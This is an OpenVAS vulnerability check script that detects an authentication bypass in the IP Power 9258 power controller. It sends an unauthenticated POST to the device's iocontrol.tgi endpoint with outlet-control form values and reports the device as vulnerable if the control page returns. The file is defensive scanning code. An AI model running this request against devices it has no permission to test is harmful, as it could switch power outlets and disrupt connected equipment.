###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ip_power_9258_48104.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# IP Power 9258 TGI Scripts Unauthorized Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103172");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-06-06 13:42:32 +0200 (Mon, 06 Jun 2011)");
  script_bugtraq_id(48104);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("IP Power 9258 TGI Scripts Unauthorized Access Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/48104");
  script_xref(name:"URL", value:"http://www.opengear.com/product-ip-power-9258.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101963/ippower-bypass.txt");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"IP Power 9258 is prone to an unauthorized-access vulnerability.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to directly access arbitrary scripts,
  bypassing authentication. A successful exploit will allow the attacker
  to run arbitrary scripts on the affected device.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache( item:url, port:port );

  if( "<title>IP9258" >< buf ) {

    useragent = http_get_user_agent();
    host = http_host_name( port:port );

    variables = string("XXX=On&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&ButtonName=Apply");

    url = dir + "/tgi/iocontrol.tgi";
    req = string( "POST ", url, " HTTP/1.1\r\n",
		  "Host: ", host, "\r\n",
		  "User-Agent: ", useragent, "\r\n",
		  "Accept: */*\r\n",
		  "Content-Length: 127\r\n",
		  "Content-Type:
		  application/x-www-form-urlencoded\r\n",
		  "\r\n",
		  variables);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(res =~ "<title>I\/O Control" && res =~ "<td>Power1</td>") {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);